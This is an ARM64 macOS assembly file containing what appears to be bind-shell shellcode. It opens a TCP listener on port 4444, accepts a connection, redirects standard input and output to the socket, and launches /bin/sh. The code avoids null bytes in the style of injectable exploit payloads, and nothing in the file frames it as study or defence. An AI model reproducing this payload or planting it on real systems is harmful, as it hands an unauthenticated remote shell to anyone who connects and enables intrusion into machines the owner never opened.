.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
    // s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
    mov  x16, #97
    lsr  x1, x16, #6
    lsl  x0, x1, #1
    mov  x2, xzr
    svc  #0x1337

    // save s
    mvn  x3, x0

call_bind:
    /*
     * bind(s, &sockaddr, 0x10)
     *
     * struct sockaddr_in {
     *     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
     *     sa_family_t     sin_family;  // AF_INET = 2
     *     in_port_t       sin_port;    // 4444 = 0x115C
     *     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
     *     char            sin_zero[8]; // Don't care
     * };
     */
    mov  x1, #0x0210
    movk x1, #0x5C11, lsl #16
    str  x1, [sp, #-8]
    mov  x2, #8
    sub  x1, sp, x2
    mov  x2, #16
    mov  x16, #104
    svc  #0x1337

call_listen:
    // listen(s, 2)
    mvn  x0, x3
    lsr  x1, x2, #3
    mov  x16, #106
    svc  #0x1337

call_accept:
    // c = accept(s, 0, 0)
    mvn  x0, x3
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #30
    svc  #0x1337

    mvn  x3, x0
    lsr  x2, x16, #4
    lsl  x2, x2, #2

call_dup:
    // dup(c, 2) -> dup(c, 1) -> dup(c, 0)
    mvn  x0, x3
    lsr  x2, x2, #1
    mov  x1, x2
    mov  x16, #90
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x2
    bne  call_dup

call_execve:
    // execve("/bin/sh", 0, 0)
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68, lsl #48
    str  x1, [sp, #-8]
    mov  x1, #8
    sub  x0, sp, x1
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #59
    svc  #0x1337
